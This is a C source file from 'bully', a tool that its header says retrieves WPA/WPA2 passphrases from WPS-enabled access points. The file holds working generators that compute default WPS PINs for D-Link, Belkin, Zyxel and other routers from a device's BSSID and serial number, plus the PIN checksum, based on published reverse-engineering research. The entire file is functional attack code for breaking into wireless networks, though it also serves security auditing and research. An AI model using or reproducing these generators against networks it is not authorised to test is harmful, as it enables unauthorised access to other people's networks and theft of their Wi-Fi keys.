/*
    bully - retrieve WPA/WPA2 passphrase from a WPS-enabled AP

    Copyright (C) 2017  wiire         <wi7ire@gmail.com>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
/*
  References:
   * http://www.devttys0.com/2014/10/reversing-d-links-wps-pin-algorithm/
   * http://www.devttys0.com/2015/04/reversing-belkins-wps-pin-algorithm/
*/
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include "pingen.h"

unsigned int m_wps_pin_checksum(unsigned int pin)
{
	unsigned int div = 0;
	while (pin) {
		div += 3 * (pin % 10);
		pin /= 10;
		div += pin % 10;
		pin /= 10;
	};
	return ((10 - div % 10) % 10);
};

unsigned int m_wps_pin_valid(unsigned int pin)
{
	return m_wps_pin_checksum(pin / 10) == (pin % 10);
};

unsigned int gen_hex2dec(uint8_t *bssid, const int offset)
{
  unsigned int pin = bssid[3] << 16 | bssid[4] << 8 | bssid[5];
  pin += offset;
  pin = pin % 10000000;
  pin = ((pin * 10) + m_wps_pin_checksum(pin));
	return pin;
};

unsigned int gen_zyxel(uint8_t *bssid, const int offset)
{
	unsigned int pin = bssid[5] << 16 | bssid[4] << 8 | bssid[3];
	pin += offset;
	pin = pin % 10000000;
  pin = ((pin * 10) + m_wps_pin_checksum(pin));
	return pin;
};

unsigned int gen_dlink(uint8_t *bssid, const int offset)
{
  unsigned int pin = bssid[3] << 16 | bssid[4] << 8 | bssid[5];
  pin += offset;
  pin = (pin ^ 0x55AA55);
  pin = pin ^ (((pin & 0x0F) << 4)
      + ((pin & 0x0F) << 8)
      + ((pin & 0x0F) << 12)
      + ((pin & 0x0F) << 16)
      + ((pin & 0x0F) << 20));
  pin = pin % 10000000;
  if (pin < 1000000) pin += ((pin % 9) * 1000000) + 1000000;
  pin = ((pin * 10) + m_wps_pin_checksum(pin));
	return pin;
};

/* Used in the Belkin code to convert an ASCII character to an integer */
static int char2int(const char c)
{
  char buf[2] = { 0 };
  buf[0] = c;
  return strtol(buf, NULL, 16);
};

unsigned int gen_belkin(uint8_t *bssid, const char *serial)
{
  int sn[4], nic[4];
  int k1, k2, pin;
  int p1, p2, p3;
  int t1, t2;
  int serial_len = strlen(serial);

  sn[0] = char2int(serial[serial_len - 1]);
  sn[1] = char2int(serial[serial_len - 2]);
  sn[2] = char2int(serial[serial_len - 3]);
  sn[3] = char2int(serial[serial_len - 4]);
  nic[0] = bssid[5] & 0x0F;
  nic[1] = (bssid[5] & 0xF0) >> 4;
  nic[2] = bssid[4] & 0x0F;
  nic[3] = (bssid[4] & 0xF0) >> 4;

  k1 = (sn[2] + sn[3] + nic[0] + nic[1]) % 16;
  k2 = (sn[0] + sn[1] + nic[3] + nic[2]) % 16;

  pin = k1 ^ sn[1];

  t1 = k1 ^ sn[0];
  t2 = k2 ^ nic[1];

  p1 = nic[0] ^ sn[1] ^ t1;
  p2 = k2 ^ nic[0] ^ t2;
  p3 = k1 ^ sn[2] ^ k2 ^ nic[2];

  k1 = k1 ^ k2;

  pin = (pin ^ k1) * 16;
  pin = (pin + t1) * 16;
  pin = (pin + p1) * 16;
  pin = (pin + t2) * 16;
  pin = (pin + p2) * 16;
  pin = (pin + k1) * 16;
  pin += p3;
  pin = (pin % 10000000) - (((pin % 10000000) / 10000000) * k1);

  return (pin * 10) + m_wps_pin_checksum(pin);
};
